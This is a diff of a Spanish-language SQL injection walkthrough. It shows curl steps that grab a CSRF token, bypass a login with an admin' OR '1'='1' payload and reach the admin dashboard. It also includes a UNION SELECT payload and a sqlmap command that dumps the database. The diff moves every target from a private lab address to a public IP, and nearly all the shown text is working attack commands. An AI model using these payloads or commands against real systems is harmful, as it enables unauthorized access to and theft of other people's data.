@@ -25,19 +25,19 @@ if (!empty($users)) {
 
 ### Paso 1: Obtener CSRF token
 ```bash
-curl -s -c cookies.txt "http://192.168.18.38:8001/login" | grep -oP 'name="_token" value="\K[^"]+'
+curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+'
 ```
 
 ### Paso 2: Inyectar SQL en el login
 ```bash
-curl -s -X POST "http://192.168.18.38:8001/login" \
+curl -s -X POST "http://37.60.230.11/login" \
   -b cookies.txt -c cookies.txt \
   -d "_token=TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x"
 ```
 
 ### Paso 3: Verificar acceso admin
 ```bash
-curl -b cookies.txt "http://192.168.18.38:8001/admin/dashboard"
+curl -b cookies.txt "http://37.60.230.11/admin/dashboard"
 ```
 
 ## Resultado (verificado)
@@ -57,7 +57,7 @@ admin' UNION SELECT * FROM users --  → Unión de resultados
 
 ## Con sqlmap
 ```bash
-sqlmap -u "http://192.168.18.38:8001/login" \
+sqlmap -u "http://37.60.230.11/login" \
   --data="login=admin&password=test" \
   --batch --level=3 --risk=2 --dump
 ```
